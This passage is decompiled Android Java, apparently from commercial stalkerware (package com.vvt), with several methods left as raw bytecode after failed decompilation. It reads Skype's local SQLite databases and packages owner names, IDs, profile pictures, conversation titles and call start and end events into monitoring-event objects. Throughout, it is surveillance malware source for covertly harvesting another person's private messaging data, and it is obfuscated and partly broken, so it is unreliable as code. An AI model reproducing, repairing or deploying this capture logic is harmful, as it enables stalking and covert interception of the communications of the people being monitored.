          localc.a((ICallLogData.Direction)localObject3);
          i10 = localArrayList2.size();
          i13 = 1;
          if (i10 > i13)
          {
            i10 = 1;
            localc.a(i10);
          }
          localc.b(localArrayList2);
          localc.a(locald);
          localf.a(str4);
          localf.b(str5);
          localc.a(localf);
          localb.a(str2);
          localb.b(str3);
          localc.a(localb);
          localArrayList1.add(localc);
          bool13 = a;
          if (!bool13) {
            break;
          }
          break;
          label1688:
          i11 = 3;
          if (i7 == i11)
          {
            localObject1 = MessageType.Text;
            i4 = ((MessageType)localObject1).getNumber();
          }
          else
          {
            i11 = 18;
            if (i7 == i11)
            {
              i11 = 30;
              if (i12 == i11)
              {
                str7 = "[Skype call start]";
              }
              else
              {
                i11 = 39;
                if (i12 == i11)
                {
                  str7 = "[Skype call ended]";
                }
                else
                {
                  i11 = 51;
                  if (i12 == i11) {
                    str7 = "[Skype accept adding event]";
                  } else {
                    str7 = "[Some Skype event]";
                  }
                }
              }
            }
            else if (str7 != null)
            {
              i11 = str7.length();
              if (i11 > 0)
              {
                i11 = 202;
                if (i12 != i11)
                {
                  localObject2 = MessageType.Text;
                  i11 = ((MessageType)localObject2).getNumber();
                  i4 |= i11;
                  str7 = g.f(str7);
                }
              }
            }
          }
        }
        label1852:
        int i4 = i5;
        break label306;
        label1859:
        i5 = i4;
        break;
        label1866:
        str7 = str1;
        i4 = i5;
      }
    }
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, int paramInt, String paramString2, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, boolean paramBoolean, SQLiteDatabase paramSQLiteDatabase3, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    boolean bool2 = false;
    Cursor localCursor = null;
    for (;;)
    {
      try
      {
        localObject1 = d();
        boolean bool3 = a;
        if (bool3) {}
        int i = -1;
        if (paramInt == i) {
          paramInt = -1 >>> 1;
        }
        i = 1;
        Object localObject3 = new String[i];
        Object localObject4 = Integer.toString(paramInt);
        localObject3[0] = localObject4;
        localCursor = paramSQLiteDatabase1.rawQuery((String)localObject1, (String[])localObject3);
        if (localCursor == null) {
          break label194;
        }
        localObject1 = paramSQLiteDatabase1;
        localObject3 = paramString1;
        localObject4 = paramb;
        localObject1 = a(paramSQLiteDatabase1, localCursor, paramString1, paramString2, paramb, paramSQLiteDatabase2, paramBoolean, paramSQLiteDatabase3, paramString3);
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool1 = c;
        if ((bool1) && (localCursor == null)) {
          continue;
        }
        localCursor.close();
        ArrayList localArrayList2 = localArrayList1;
        continue;
      }
      finally
      {
        if (localCursor == null) {
          continue;
        }
        localCursor.close();
      }
      bool2 = a;
      if (bool2) {}
      return (ArrayList)localObject1;
      label194:
      ArrayList localArrayList3 = localArrayList1;
    }
  }
  
  /* Error */
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString1, ArrayList paramArrayList, String paramString2)
  {
    // Byte code:
    //   0: new 215	java/util/ArrayList
    //   3: astore 4
    //   5: aload 4
    //   7: invokespecial 279	java/util/ArrayList:<init>	()V
    //   10: aload_2
    //   11: invokestatic 494	com/vvt/capture/e/d:a	(Ljava/util/ArrayList;)Ljava/lang/String;
    //   14: astore 5
    //   16: aconst_null
    //   17: astore 6
    //   19: getstatic 17	com/vvt/capture/e/d:a	Z
    //   22: istore 7
    //   24: iload 7
    //   26: ifeq +3 -> 29
    //   29: iconst_0
    //   30: istore 7
    //   32: aconst_null
    //   33: astore 8
    //   35: iconst_0
    //   36: anewarray 182	java/lang/String
    //   39: astore 8
    //   41: aload_0
    //   42: aload 5
    //   44: aload 8
    //   46: invokevirtual 383	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   49: astore 6
    //   51: aload 6
    //   53: ifnull +297 -> 350
    //   56: aload 6
    //   58: invokeinterface 497 1 0
    //   63: istore 9
    //   65: iload 9
    //   67: ifeq +283 -> 350
    //   70: aload 6
    //   72: invokeinterface 500 1 0
    //   77: istore 9
    //   79: iload 9
    //   81: ifne +269 -> 350
    //   84: new 700	com/vvt/im/events/info/e
    //   87: astore 8
    //   89: aload 8
    //   91: invokespecial 813	com/vvt/im/events/info/e:<init>	()V
    //   94: ldc_w 392
    //   97: astore 5
    //   99: aload 6
    //   101: aload 5
    //   103: invokeinterface 59 2 0
    //   108: istore 9
    //   110: aload 6
    //   112: iload 9
    //   114: invokeinterface 389 2 0
    //   119: astore 5
    //   121: aload 5
    //   123: ifnonnull +30 -> 153
    //   126: ldc_w 394
    //   129: astore 5
    //   131: aload 6
    //   133: aload 5
    //   135: invokeinterface 59 2 0
    //   140: istore 9
    //   142: aload 6
    //   144: iload 9
    //   146: invokeinterface 389 2 0
    //   151: astore 5
    //   153: ldc_w 385
    //   156: astore 10
    //   158: aload 6
    //   160: aload 10
    //   162: invokeinterface 59 2 0
    //   167: istore 11
    //   169: aload 6
    //   171: iload 11
    //   173: invokeinterface 389 2 0
    //   178: astore 10
    //   180: ldc_w 398
    //   183: astore 12
    //   185: aload 6
    //   187: aload 12
    //   189: invokeinterface 59 2 0
    //   194: istore 13
    //   196: aload 6
    //   198: iload 13
    //   200: invokeinterface 389 2 0
    //   205: astore 12
    //   207: ldc_w 401
    //   210: astore 14
    //   212: aload 6
    //   214: aload 14
    //   216: invokeinterface 59 2 0
    //   221: istore 15
    //   223: aload 6
    //   225: iload 15
    //   227: invokeinterface 405 2 0
    //   232: astore 14
    //   234: getstatic 816	com/vvt/im/events/ImMediaFileType:USER_PROFILE	Lcom/vvt/im/events/ImMediaFileType;
    //   237: astore 16
    //   239: aload_1
    //   240: aload 14
    //   242: aload 16
    //   244: invokestatic 411	com/vvt/capture/e/d:a	(Ljava/lang/String;[BLcom/vvt/im/events/ImMediaFileType;)Ljava/lang/String;
    //   247: astore 14
    //   249: aload 8
    //   251: aload 14
    //   253: invokevirtual 817	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   256: aload 8
    //   258: aload 5
    //   260: invokevirtual 818	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   263: aload 8
    //   265: aload 10
    //   267: invokevirtual 819	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   270: aload 8
    //   272: aload 12
    //   274: invokevirtual 821	com/vvt/im/events/info/e:e	(Ljava/lang/String;)V
    //   277: aload 4
    //   279: aload 8
    //   281: invokevirtual 295	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   284: pop
    //   285: aload 6
    //   287: invokeinterface 53 1 0
    //   292: pop
    //   293: goto -223 -> 70
    //   296: astore 5
    //   298: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   301: istore 9
    //   303: iload 9
    //   305: ifeq +3 -> 308
    //   308: aload 6
    //   310: ifnull +10 -> 320
    //   313: aload 6
    //   315: invokeinterface 66 1 0
    //   320: aload 4
    //   322: areturn
    //   323: astore 17
    //   325: iconst_0
    //   326: istore 9
    //   328: aconst_null
    //   329: astore 5
    //   331: aload 17
    //   333: astore 6
    //   335: aload 5
    //   337: ifnull +10 -> 347
    //   340: aload 5
    //   342: invokeinterface 66 1 0
    //   347: aload 6
    //   349: athrow
    //   350: aload 6
    //   352: ifnull -32 -> 320
    //   355: goto -42 -> 313
    //   358: astore 17
    //   360: aload 6
    //   362: astore 5
    //   364: aload 17
    //   366: astore 6
    //   368: goto -33 -> 335
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	371	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	371	1	paramString1	String
    //   0	371	2	paramArrayList	ArrayList
    //   0	371	3	paramString2	String
    //   3	318	4	localArrayList	ArrayList
    //   14	245	5	str1	String
    //   296	1	5	localException	Exception
    //   329	34	5	localObject1	Object
    //   17	350	6	localObject2	Object
    //   22	9	7	bool1	boolean
    //   33	247	8	localObject3	Object
    //   63	17	9	bool2	boolean
    //   108	37	9	i	int
    //   301	26	9	bool3	boolean
    //   156	110	10	str2	String
    //   167	5	11	j	int
    //   183	90	12	str3	String
    //   194	5	13	k	int
    //   210	42	14	localObject4	Object
    //   221	5	15	m	int
    //   237	6	16	localImMediaFileType	ImMediaFileType
    //   323	9	17	localObject5	Object
    //   358	7	17	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   19	22	296	java/lang/Exception
    //   35	39	296	java/lang/Exception
    //   44	49	296	java/lang/Exception
    //   56	63	296	java/lang/Exception
    //   70	77	296	java/lang/Exception
    //   84	87	296	java/lang/Exception
    //   89	94	296	java/lang/Exception
    //   101	108	296	java/lang/Exception
    //   112	119	296	java/lang/Exception
    //   133	140	296	java/lang/Exception
    //   144	151	296	java/lang/Exception
    //   160	167	296	java/lang/Exception
    //   171	178	296	java/lang/Exception
    //   187	194	296	java/lang/Exception
    //   198	205	296	java/lang/Exception
    //   214	221	296	java/lang/Exception
    //   225	232	296	java/lang/Exception
    //   234	237	296	java/lang/Exception
    //   242	247	296	java/lang/Exception
    //   251	256	296	java/lang/Exception
    //   258	263	296	java/lang/Exception
    //   265	270	296	java/lang/Exception
    //   272	277	296	java/lang/Exception
    //   279	285	296	java/lang/Exception
    //   285	293	296	java/lang/Exception
    //   19	22	323	finally
    //   35	39	323	finally
    //   44	49	323	finally
    //   56	63	358	finally
    //   70	77	358	finally
    //   84	87	358	finally
    //   89	94	358	finally
    //   101	108	358	finally
    //   112	119	358	finally
    //   133	140	358	finally
    //   144	151	358	finally
    //   160	167	358	finally
    //   171	178	358	finally
    //   187	194	358	finally
    //   198	205	358	finally
    //   214	221	358	finally
    //   225	232	358	finally
    //   234	237	358	finally
    //   242	247	358	finally
    //   251	256	358	finally
    //   258	263	358	finally
    //   265	270	358	finally
    //   272	277	358	finally
    //   279	285	358	finally
    //   285	293	358	finally
    //   298	301	358	finally
  }
  
  /* Error */
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase, String paramString, boolean paramBoolean)
  {
    // Byte code:
    //   0: getstatic 17	com/vvt/capture/e/d:a	Z
    //   3: istore_3
    //   4: iload_3
    //   5: ifeq +3 -> 8
    //   8: new 215	java/util/ArrayList
    //   11: astore 4
    //   13: aload 4
    //   15: invokespecial 279	java/util/ArrayList:<init>	()V
    //   18: lconst_0
    //   19: lstore 5
    //   21: iconst_0
    //   22: istore 7
    //   24: iconst_1
    //   25: istore 8
    //   27: iload 8
    //   29: anewarray 4	java/lang/Object
    //   32: astore 9
    //   34: iconst_0
    //   35: istore 10
    //   37: aconst_null
    //   38: astore 11
    //   40: aload 9
    //   42: iconst_0
    //   43: ldc_w 526
    //   46: aastore
    //   47: ldc_w 457
    //   50: aload 9
    //   52: invokestatic 267	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   55: astore 12
    //   57: iconst_1
    //   58: anewarray 182	java/lang/String
    //   61: astore 13
    //   63: iconst_0
    //   64: istore_3
    //   65: aconst_null
    //   66: astore 14
    //   68: aload 13
    //   70: iconst_0
    //   71: aload_1
    //   72: aastore
    //   73: lconst_0
    //   74: lstore 15
    //   76: lload 5
    //   78: lload 15
    //   80: lcmp
    //   81: istore_3
    //   82: iload_3
    //   83: ifne +105 -> 188
    //   86: bipush 10
    //   88: istore_3
    //   89: iload 7
    //   91: iload_3
    //   92: if_icmpge +96 -> 188
    //   95: aconst_null
    //   96: astore 17
    //   98: aload_0
    //   99: ifnull +251 -> 350
    //   102: ldc_w 518
    //   105: astore 9
    //   107: iconst_0
    //   108: istore 10
    //   110: aconst_null
    //   111: astore 11
    //   113: iconst_0
    //   114: istore 18
    //   116: aconst_null
    //   117: astore 19
    //   119: iconst_0
    //   120: istore 20
    //   122: aconst_null
    //   123: astore 21
    //   125: aconst_null
    //   126: astore 22
    //   128: aload_0
    //   129: astore 14
    //   131: aload_0
    //   132: aload 9
    //   134: aconst_null
    //   135: aload 12
    //   137: aload 13
    //   139: aconst_null
    //   140: aconst_null
    //   141: aconst_null
    //   142: invokevirtual 465	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   145: astore 14
    //   147: aload 14
    //   149: ifnull +17 -> 166
    //   152: aload 14
    //   154: invokeinterface 521 1 0
    //   159: istore 8
    //   161: iload 8
    //   163: ifgt +394 -> 557
    //   166: getstatic 17	com/vvt/capture/e/d:a	Z
    //   169: istore 8
    //   171: iload 8
    //   173: ifeq +3 -> 176
    //   176: aload 14
    //   178: ifnull +10 -> 188
    //   181: aload 14
    //   183: invokeinterface 66 1 0
    //   188: getstatic 17	com/vvt/capture/e/d:a	Z
    //   191: istore_3
    //   192: iload_3
    //   193: ifeq +3 -> 196
    //   196: aload 4
    //   198: astore 14
    //   200: aload 14
    //   202: areturn
    //   203: aload 14
    //   205: invokeinterface 53 1 0
    //   210: istore 18
    //   212: iload 18
    //   214: ifeq +357 -> 571
    //   217: ldc_w 823
    //   220: astore 19
    //   222: aload 14
    //   224: aload 19
    //   226: invokeinterface 59 2 0
    //   231: istore 18
    //   233: aload 14
    //   235: iload 18
    //   237: invokeinterface 63 2 0
    //   242: lstore 23
    //   244: ldc_w 825
    //   247: astore 19
    //   249: aload 14
    //   251: aload 19
    //   253: invokeinterface 59 2 0
    //   258: istore 18
    //   260: aload 14
    //   262: iload 18
    //   264: invokeinterface 389 2 0
    //   269: astore 19
    //   271: ldc_w 827
    //   274: astore 21
    //   276: aload 14
    //   278: aload 21
    //   280: invokeinterface 59 2 0
    //   285: istore 20
    //   287: aload 14
    //   289: iload 20
    //   291: invokeinterface 405 2 0
    //   296: astore 21
    //   298: new 233	com/vvt/capture/e/a
    //   301: astore 22
    //   303: aload 22
    //   305: invokespecial 828	com/vvt/capture/e/a:<init>	()V
    //   308: aload 22
    //   310: lload 23
    //   312: putfield 243	com/vvt/capture/e/a:removeFromPath	J
    //   315: aload 22
    //   317: aload 19
    //   319: putfield 235	com/vvt/capture/e/a:a	Ljava/lang/String;
    //   322: aload 22
    //   324: aload 21
    //   326: putfield 831	com/vvt/capture/e/a:MyUncaughtExceptionHandler	[B
    //   329: aload 4
    //   331: aload 22
    //   333: invokevirtual 295	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   336: pop
    //   337: getstatic 17	com/vvt/capture/e/d:a	Z
    //   340: istore 18
    //   342: iload 18
    //   344: ifeq -141 -> 203
    //   347: goto -144 -> 203
    //   350: getstatic 17	com/vvt/capture/e/d:a	Z
    //   353: istore_3
    //   354: iload_3
    //   355: ifeq +3 -> 358
    //   358: lload 5
    //   360: lstore 15
    //   362: aload 17
    //   364: ifnull +10 -> 374
    //   367: aload 17
    //   369: invokeinterface 66 1 0
    //   374: getstatic 17	com/vvt/capture/e/d:a	Z
    //   377: istore 10
    //   379: iload 10
    //   381: ifeq +3 -> 384
    //   384: iload_2
    //   385: ifeq +78 -> 463
    //   388: getstatic 17	com/vvt/capture/e/d:a	Z
    //   391: istore_3
    //   392: iload_3
    //   393: ifeq +3 -> 396
    //   396: aload 4
    //   398: astore 14
    //   400: goto -200 -> 200
    //   403: astore 19
    //   405: lload 23
    //   407: lstore 15
    //   409: aload 14
    //   411: astore 11
    //   413: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   416: istore 18
    //   418: iload 18
    //   420: ifeq +3 -> 423
    //   423: aload 11
    //   425: ifnull -51 -> 374
    //   428: aload 11
    //   430: invokeinterface 66 1 0
    //   435: goto -61 -> 374
    //   438: astore 9
    //   440: aload 14
    //   442: astore 17
    //   444: aload 9
    //   446: astore 14
    //   448: aload 17
    //   450: ifnull +10 -> 460
    //   453: aload 17
    //   455: invokeinterface 66 1 0
    //   460: aload 14
    //   462: athrow
    //   463: lconst_0
    //   464: lstore 25
    //   466: lload 15
    //   468: lload 25
    //   470: lcmp
    //   471: istore 10
    //   473: iload 10
    //   475: ifgt +89 -> 564
    //   478: getstatic 17	com/vvt/capture/e/d:a	Z
    //   481: istore 10
    //   483: iload 10
    //   485: ifeq +3 -> 488
    //   488: ldc2_w 198
    //   491: lstore 25
    //   493: lload 25
    //   495: invokestatic 100	android/os/SystemClock:sleep	(J)V
    //   498: iload 7
    //   500: iconst_1
    //   501: iadd
    //   502: istore 10
    //   504: iload 10
    //   506: istore 7
    //   508: lload 15
    //   510: lstore 5
    //   512: goto -439 -> 73
    //   515: astore 14
    //   517: aload 11
    //   519: astore 17
    //   521: goto -73 -> 448
    //   524: astore 14
    //   526: goto -78 -> 448
    //   529: astore 14
    //   531: iconst_0
    //   532: istore 10
    //   534: aconst_null
    //   535: astore 11
    //   537: lload 5
    //   539: lstore 15
    //   541: goto -128 -> 413
    //   544: astore 9
    //   546: aload 14
    //   548: astore 11
    //   550: lload 5
    //   552: lstore 15
    //   554: goto -141 -> 413
    //   557: lload 5
    //   559: lstore 23
    //   561: goto -358 -> 203
    //   564: iload 7
    //   566: istore 10
    //   568: goto -64 -> 504
    //   571: aload 14
    //   573: astore 17
    //   575: lload 23
    //   577: lstore 15
    //   579: goto -217 -> 362
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	582	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	582	1	paramString	String
    //   0	582	2	paramBoolean	boolean
    //   3	80	3	bool1	boolean
    //   88	5	3	i	int
    //   191	202	3	bool2	boolean
    //   11	386	4	localArrayList	ArrayList
    //   19	539	5	l1	long
    //   22	543	7	j	int
    //   25	137	8	k	int
    //   169	3	8	bool3	boolean
    //   32	101	9	localObject1	Object
    //   438	7	9	localObject2	Object
    //   544	1	9	localException1	Exception
    //   35	449	10	bool4	boolean
    //   502	65	10	m	int
    //   38	511	11	localObject3	Object
    //   55	81	12	str1	String
    //   61	77	13	arrayOfString	String[]
    //   66	395	14	localObject4	Object
    //   515	1	14	localObject5	Object
    //   524	1	14	localObject6	Object
    //   529	43	14	localException2	Exception
    //   74	504	15	l2	long
    //   96	478	17	localObject7	Object
    //   114	99	18	bool5	boolean
    //   231	32	18	n	int
    //   340	79	18	bool6	boolean
    //   117	201	19	str2	String
    //   403	1	19	localException3	Exception
    //   120	170	20	i1	int
    //   123	202	21	localObject8	Object
    //   126	206	22	locala	a
    //   242	334	23	l3	long
    //   464	30	25	l4	long
    // Exception table:
    //   from	to	target	type
    //   203	210	403	java/lang/Exception
    //   224	231	403	java/lang/Exception
    //   235	242	403	java/lang/Exception
    //   251	258	403	java/lang/Exception
    //   262	269	403	java/lang/Exception
    //   278	285	403	java/lang/Exception
    //   289	296	403	java/lang/Exception
    //   298	301	403	java/lang/Exception
    //   303	308	403	java/lang/Exception
    //   310	315	403	java/lang/Exception
    //   317	322	403	java/lang/Exception
    //   324	329	403	java/lang/Exception
    //   331	337	403	java/lang/Exception
    //   337	340	403	java/lang/Exception
    //   152	159	438	finally
    //   166	169	438	finally
    //   203	210	438	finally
    //   224	231	438	finally
    //   235	242	438	finally
    //   251	258	438	finally
    //   262	269	438	finally
    //   278	285	438	finally
    //   289	296	438	finally
    //   298	301	438	finally
    //   303	308	438	finally
    //   310	315	438	finally
    //   317	322	438	finally
    //   324	329	438	finally
    //   331	337	438	finally
    //   337	340	438	finally
    //   413	416	515	finally
    //   141	145	524	finally
    //   350	353	524	finally
    //   141	145	529	java/lang/Exception
    //   350	353	529	java/lang/Exception
    //   152	159	544	java/lang/Exception
    //   166	169	544	java/lang/Exception
  }
  
  /* Error */
  public static ArrayList a(String paramString1, int paramInt, com.vvt.base.b paramb, boolean paramBoolean, String paramString2)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 5
    //   3: new 215	java/util/ArrayList
    //   6: astore 6
    //   8: aload 6
    //   10: invokespecial 279	java/util/ArrayList:<init>	()V
    //   13: invokestatic 585	com/vvt/capture/e/d:removeFromPath	()Ljava/lang/String;
    //   16: astore 7
    //   18: aload 7
    //   20: ifnull +215 -> 235
    //   23: ldc_w 587
    //   26: astore 8
    //   28: aload 8
    //   30: aload 7
    //   32: invokestatic 592	com/vvt/capture/e/removeFromPath/a/a:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   35: astore 8
    //   37: aload 8
    //   39: ifnull +84 -> 123
    //   42: ldc_w 594
    //   45: astore 9
    //   47: aload 9
    //   49: aload 7
    //   51: invokestatic 596	com/vvt/capture/e/removeFromPath/a/a:MyUncaughtExceptionHandler	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   54: astore 5
    //   56: ldc_w 594
    //   59: astore 9
    //   61: aload 7
    //   63: aload 9
    //   65: invokestatic 598	com/vvt/capture/e/removeFromPath/a/a:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   68: astore 10
    //   70: aload_0
    //   71: astore 9
    //   73: aload 8
    //   75: aload_0
    //   76: iload_1
    //   77: aload 7
    //   79: aload_2
    //   80: aload 5
    //   82: iload_3
    //   83: aload 10
    //   85: aload 4
    //   87: invokestatic 834	com/vvt/capture/e/d:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;ILjava/lang/String;Lcom/vvt/base/removeFromPath;Landroid/database/sqlite/SQLiteDatabase;ZLandroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)Ljava/util/ArrayList;
    //   90: astore 6
    //   92: aload 8
    //   94: astore 9
    //   96: aload 6
    //   98: astore 8
    //   100: aload 9
    //   102: ifnull +8 -> 110
    //   105: aload 9
    //   107: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   110: aload 5
    //   112: ifnull +8 -> 120
    //   115: aload 5
    //   117: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   120: aload 8
    //   122: areturn
    //   123: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   126: istore 11
    //   128: iload 11
    //   130: ifeq +3 -> 133
    //   133: aload 8
    //   135: astore 9
    //   137: aload 6
    //   139: astore 8
    //   141: goto -41 -> 100
    //   144: astore 8
    //   146: aconst_null
    //   147: astore 8
    //   149: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   152: istore 11
    //   154: iload 11
    //   156: ifeq +3 -> 159
    //   159: aload 8
    //   161: ifnull +8 -> 169
    //   164: aload 8
    //   166: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   169: aload 5
    //   171: ifnull +8 -> 179
    //   174: aload 5
    //   176: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   179: aload 6
    //   181: astore 8
    //   183: goto -63 -> 120
    //   186: astore 8
    //   188: iconst_0
    //   189: istore 11
    //   191: aconst_null
    //   192: astore 9
    //   194: aload 9
    //   196: ifnull +8 -> 204
    //   199: aload 9
    //   201: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   204: aload 5
    //   206: ifnull +8 -> 214
    //   209: aload 5
    //   211: invokevirtual 78	android/database/sqlite/SQLiteDatabase:close	()V
    //   214: aload 8
    //   216: athrow
    //   217: astore 12
    //   219: aload 8
    //   221: astore 9
    //   223: aload 12
    //   225: astore 8
    //   227: goto -33 -> 194
    //   230: astore 9
    //   232: goto -83 -> 149
    //   235: iconst_0
    //   236: istore 11
    //   238: aconst_null
    //   239: astore 9
    //   241: aload 6
    //   243: astore 8
    //   245: goto -145 -> 100
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	248	0	paramString1	String
    //   0	248	1	paramInt	int
    //   0	248	2	paramb	com.vvt.base.removeFromPath
    //   0	248	3	paramBoolean	boolean
    //   0	248	4	paramString2	String
    //   1	209	5	localSQLiteDatabase1	SQLiteDatabase
    //   6	236	6	localArrayList1	ArrayList
    //   16	62	7	str	String
    //   26	114	8	localObject1	Object
    //   144	1	8	localException1	Exception
    //   147	35	8	localArrayList2	ArrayList
    //   186	34	8	localObject2	Object
    //   225	19	8	localObject3	Object
    //   45	177	9	localObject4	Object
    //   230	1	9	localException2	Exception
    //   239	1	9	localObject5	Object
    //   68	16	10	localSQLiteDatabase2	SQLiteDatabase
    //   126	111	11	bool	boolean
    //   217	7	12	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   13	16	144	java/lang/Exception
    //   30	35	144	java/lang/Exception
    //   13	16	186	finally
    //   30	35	186	finally
    //   49	54	217	finally
    //   63	68	217	finally
    //   85	90	217	finally
    //   123	126	217	finally
    //   149	152	217	finally
    //   49	54	230	java/lang/Exception
    //   63	68	230	java/lang/Exception
    //   85	90	230	java/lang/Exception
    //   123	126	230	java/lang/Exception
  }
  
  public static ArrayList a(String paramString1, String paramString2, String paramString3, int paramInt, com.vvt.base.b paramb, String paramString4, boolean paramBoolean, String paramString5, String paramString6)
  {
    Object localObject1 = null;
    SQLiteDatabase localSQLiteDatabase1 = null;
    SQLiteDatabase localSQLiteDatabase2 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        String str = c(paramString2);
        if (str == null) {
          break label169;
        }
        i = 17;
        localObject1 = com.vvt.p.c.a(i, paramString1);
        i = 17;
        localSQLiteDatabase1 = com.vvt.p.c.a(i, paramString4);
        i = 17;
        localSQLiteDatabase2 = com.vvt.p.c.a(i, paramString5);
        Object localObject2 = localObject1;
        if (localObject2 != null) {
          localObject1 = paramString3;
        }
        localObject1 = localArrayList;
      }
      finally
      {
        try
        {
          localObject1 = a((SQLiteDatabase)localObject2, paramString3, paramInt, str, paramb, localSQLiteDatabase1, paramBoolean, localSQLiteDatabase2, paramString6);
          if (localObject2 != null) {
            ((SQLiteDatabase)localObject2).close();
          }
          if (localSQLiteDatabase1 != null) {
            localSQLiteDatabase1.close();
          }
          return (ArrayList)localObject1;
        }
        finally
        {
          localObject1 = localObject3;
          localObject4 = localObject5;
        }
        localObject3 = finally;
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase1 != null) {
          localSQLiteDatabase1.close();
        }
      }
      continue;
      label169:
      int i = 0;
      Object localObject4 = null;
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, String paramString3, long paramLong1, long paramLong2, com.vvt.base.b paramb, String paramString4, boolean paramBoolean, String paramString5, String paramString6)
  {
    Object localObject1 = null;
    SQLiteDatabase localSQLiteDatabase1 = null;
    SQLiteDatabase localSQLiteDatabase2 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    for (;;)
    {
      try
      {
        String str = c(paramString2);
        if (str == null) {
          break label178;
        }
        int i = 17;
        localObject1 = com.vvt.p.c.a(i, paramString1);
        i = 17;
        localSQLiteDatabase1 = com.vvt.p.c.a(i, paramString4);
        i = 17;
        localSQLiteDatabase2 = com.vvt.p.c.a(i, paramString5);
        Object localObject2 = localObject1;
        if (localObject2 != null) {}
        localObject1 = localArrayList;
      }
      finally
      {
        try
        {
          localObject1 = a((SQLiteDatabase)localObject2, paramLong1, paramString3, paramLong2, str, paramb, localSQLiteDatabase1, paramBoolean, localSQLiteDatabase2, paramString6);
          if (localObject2 != null) {
            ((SQLiteDatabase)localObject2).close();
          }
          if (localSQLiteDatabase1 != null) {
            localSQLiteDatabase1.close();
          }
          bool = a;
          if (bool) {}
          return (ArrayList)localObject1;
        }
        finally
        {
          localObject1 = localObject3;
          localObject4 = localObject5;
        }
        localObject3 = finally;
        if (localObject1 != null) {
          ((SQLiteDatabase)localObject1).close();
        }
        if (localSQLiteDatabase1 != null) {
          localSQLiteDatabase1.close();
        }
      }
      continue;
      label178:
      boolean bool = false;
      Object localObject4 = null;
    }
  }
  
  static List a(com.vvt.capture.e.a.c paramc)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramc.h();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.SKYPE.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramc.e().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramc.e().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramc.e().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramc.e().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramc.e().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramc.j().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramc.j().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramc.j().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramc.j().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramc.j().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramc.h();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.SKYPE.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramc.e().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
